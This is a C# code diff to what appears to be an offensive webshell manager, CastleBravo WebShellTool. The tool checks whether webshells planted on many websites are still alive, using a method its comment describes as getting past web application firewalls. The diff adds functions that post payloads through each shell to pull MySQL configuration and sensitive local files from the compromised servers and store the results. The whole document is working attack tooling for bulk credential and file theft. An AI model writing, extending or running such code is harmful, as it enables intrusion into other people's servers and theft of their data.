@@ -16,8 +16,16 @@ namespace C2.Business.CastleBravo.WebShellTool
     {
         public static ProxySetting Proxy { get; set; } = ProxySetting.Empty;
         private int NumberOfAlive { get; set; }
+        private int NumberOfsuccessful { get; set; }
         private int NumberOfHost { get => setOfHost.Count; }
         private int NumberOfIPAddress { get => setOfIPAddress.Count; }
+        public InfoType InfoCollectionType { get; set; } = InfoType.Empty;
+        public enum InfoType
+        {
+            Mysql,
+            SensitiveFile,
+            Empty
+        }
 
         private HashSet<string> setOfIPAddress;
         private HashSet<string> setOfHost;
@@ -107,7 +115,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             try
             {
                 using (Stream stream = File.Open(configFFP, FileMode.Create))
-                   new BinaryFormatter().Serialize(stream, tasks);
+                    new BinaryFormatter().Serialize(stream, tasks);
             }
             catch { }
         }
@@ -264,7 +272,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             foreach (ListViewItem lvi in LV.Items)
             {   // 没启用跳过尸体, 清空 或 死状态 清空
-                if (lvi.SubItems[5].Text.In(new string[] { "×", "待"}))
+                if (lvi.SubItems[5].Text.In(new string[] { "×", "待" }))
                     lvi.SubItems[5].Text = "待";
                 else
                     this.progressBar.Maximum--;
@@ -279,7 +287,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             foreach (ListViewItem lvi in LV.Items)
                 ClearAliveItems(lvi);
-            
+
             RefreshAll(false, safeMode);
             EndRefresh();
         }
@@ -289,17 +297,17 @@ namespace C2.Business.CastleBravo.WebShellTool
             s = DateTime.Now;
             using (new ControlEnableGuarder(this.contextMenuStrip))
             using (new ToolStripItemEnableGuarder(this.enableItems))
-            foreach (ListViewItem lvi in LV.Items)
-            {
-                if (refreshNeedStop)
-                    break;
-                // 启用二刷
-                if (skipAlive && lvi.SubItems[5].Text != "待")
-                    continue;
-                UpdateAliveItems(lvi, safeMode);
-                UpdateProgress();
-                CheckSavePoint(); // 5分钟保存一次
-            }
+                foreach (ListViewItem lvi in LV.Items)
+                {
+                    if (refreshNeedStop)
+                        break;
+                    // 启用二刷
+                    if (skipAlive && lvi.SubItems[5].Text != "待")
+                        continue;
+                    UpdateAliveItems(lvi, safeMode);
+                    UpdateProgress();
+                    CheckSavePoint(); // 5分钟保存一次
+                }
         }
 
         private void EndRefresh()
@@ -326,6 +334,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             this.progressBar.Maximum = LV.Items.Count;
             this.refreshNeedStop = false;
             this.NumberOfAlive = 0;
+            this.NumberOfsuccessful = 0;
             this.setOfIPAddress.Clear();
             this.setOfHost.Clear();
         }
@@ -334,7 +343,7 @@ namespace C2.Business.CastleBravo.WebShellTool
         {
             WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
             string rts = RefreshTaskStatus(task, safeMode);
-            
+
             if (rts == "√")
             {
                 this.NumberOfAlive++;
@@ -349,12 +358,23 @@ namespace C2.Business.CastleBravo.WebShellTool
         }
         private void UpdateProgress()
         {
-            this.progressMenu.Text = string.Format("{0}/{1} - 活 {2} - 站 {3} - IP {4}", 
-                ++progressBar.Value, 
-                progressBar.Maximum,
-                NumberOfAlive,
-                NumberOfHost,
-                NumberOfIPAddress);
+            if (!InfoCollectionType.Equals(InfoType.Empty))
+            {
+                this.progressMenu.Text = string.Format("{0}/{1} - 成功 {2}",
+                    ++progressBar.Value,
+                    progressBar.Maximum,
+                    NumberOfsuccessful);
+            }
+            else
+            {
+                this.progressMenu.Text = string.Format("{0}/{1} - 活 {2} - 站 {3} - IP {4}",
+                    ++progressBar.Value,
+                    progressBar.Maximum,
+                    NumberOfAlive,
+                    NumberOfHost,
+                    NumberOfIPAddress);
+            }
+
         }
 
         private static void ClearAliveItems(ListViewItem lvi)
@@ -368,9 +388,9 @@ namespace C2.Business.CastleBravo.WebShellTool
         private string RefreshTaskStatus(WebShellTaskConfig task, bool safeMode)
         {
             string status = "×";
-            using (GuarderUtil.WaitCursor) 
+            using (GuarderUtil.WaitCursor)
             {
-                
+
                 // safe模式下 跳过国内网站
                 bool isChina = RefreshIPAddress(task);
                 if (safeMode && isChina)
@@ -378,14 +398,17 @@ namespace C2.Business.CastleBravo.WebShellTool
 
                 // 我总结的print穿透WAF大法
                 if (PostPrintTimeout(task))
-                    return "√";   
+                    return "√";
             }
             return status;
         }
 
-        private bool PostPrintTimeout(WebShellTaskConfig task, int timeout = 5)
+        private bool PostPrintTimeout(WebShellTaskConfig task, int timeout = 5, bool isCheckAlive = true)
         {   // WebClient的超时是响应超时, 但有时候网页会有响应,但加载慢, 需要整体超时控制
-            var t = Task.Run(() => CheckAlive(task));
+
+
+            var t = isCheckAlive ? Task.Run(() => CheckAlive(task)) : Task.Run(() => CollectInfo(task));
+
             // 代理慢, timeout富裕一些
             timeout = Proxy == ProxySetting.Empty ? timeout : timeout * 2;
 
@@ -431,8 +454,37 @@ namespace C2.Business.CastleBravo.WebShellTool
 
                 string result = WebClientEx.Post(url, pass + payload, 1500, Proxy);
                 return result.Contains(seed);
-            } catch { return false; }
-            
+            }
+            catch { return false; }
+
+        }
+        private bool CollectInfo(WebShellTaskConfig task)
+        {
+            bool isSuccess = false;
+            try
+            {
+                string url = NetUtil.FormatUrl(task.Url);
+                string password = task.Password;
+
+                switch (InfoCollectionType)
+                {
+                    case InfoType.Mysql:
+                        task.DatabaseConfig = WebClientEx.Post(url, string.Format("{0}={1};", password, Global.mysqlPayload), 1500, Proxy);
+                        return true;
+                    case InfoType.SensitiveFile:
+                        task.DatabaseConfig = WebClientEx.Post(url, string.Format("{0}={1};", password, Global.localFilePayload), 1500, Proxy);
+                        return true;
+                    default:
+                        task.DatabaseConfig = string.Empty;
+                        break;
+                }
+            }
+            catch (Exception ex)
+            {
+                task.DatabaseConfig = ex.Message;
+            }
+            return isSuccess;
+
         }
 
         private void AddAllShellMenu_Click(object sender, EventArgs e)
@@ -441,7 +493,7 @@ namespace C2.Business.CastleBravo.WebShellTool
             if (dialog.ShowDialog() != DialogResult.OK)
                 return;
 
-            foreach(WebShellTaskConfig task in dialog.Tasks)
+            foreach (WebShellTaskConfig task in dialog.Tasks)
             {
                 if (task == WebShellTaskConfig.Empty)
                     continue;
@@ -489,7 +541,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private void SaveResultToLocal(string path)
         {
-            StreamWriter sw = new StreamWriter(path, false); 
+            StreamWriter sw = new StreamWriter(path, false);
             try
             {
                 List<string> tmpLists = new List<string>();
@@ -497,7 +549,7 @@ namespace C2.Business.CastleBravo.WebShellTool
                 {
                     tmpLists.Clear();
                     for (int i = 0; i < lvi.SubItems.Count; i++)
-                        tmpLists.Add(lvi.SubItems[i].Text.Replace("\r\n"," "));
+                        tmpLists.Add(lvi.SubItems[i].Text.Replace("\r\n", " "));
                     sw.WriteLine(string.Join("\t", tmpLists.ToArray()));
                 }
             }
@@ -536,7 +588,7 @@ namespace C2.Business.CastleBravo.WebShellTool
 
             foreach (ListViewItem lvi in LV.Items)
             {
-                switch(lvi.SubItems[5].Text)
+                switch (lvi.SubItems[5].Text)
                 {
                     case "√":
                         alive++;
@@ -558,12 +610,46 @@ namespace C2.Business.CastleBravo.WebShellTool
 
         private void WeakPasswdBlastingMenuItem_Click(object sender, EventArgs e)
         {
-
+            this.InfoCollectionType = InfoType.Mysql;
+            InfoCollection_RefreshAllTaskStatus();
         }
 
         private void LocalSensitiveFileScanMenuItem_Click(object sender, EventArgs e)
         {
-
+            this.InfoCollectionType = InfoType.SensitiveFile;
+            InfoCollection_RefreshAllTaskStatus();
         }
+        private void InfoCollection_RefreshAllTaskStatus()
+        {   // 刷新前先强制清空
+            ResetProgressMenu();
+
+            foreach (ListViewItem lvi in LV.Items)
+                lvi.SubItems[7].Text = string.Empty; ;
+
+            RefreshScanResult();
+            EndRefresh();
+            this.InfoCollectionType = InfoType.Empty;
+        }
+        private void RefreshScanResult()
+        {
+            s = DateTime.Now;
+            using (new ControlEnableGuarder(this.contextMenuStrip))
+            using (new ToolStripItemEnableGuarder(this.enableItems))
+            foreach (ListViewItem lvi in LV.Items)
+            {
+                if (refreshNeedStop)
+                    break;
+                WebShellTaskConfig task = lvi.Tag as WebShellTaskConfig;
+                if (PostPrintTimeout(task, 90, false))
+                {
+                    this.NumberOfsuccessful++;
+                }
+                lvi.SubItems[7].Text = task.DatabaseConfig;
+                lvi.ListView.RedrawItems(lvi.Index, lvi.Index, false);
+                UpdateProgress();
+                CheckSavePoint(); // 5分钟保存一次
+            }
+        }
+
     }
 }
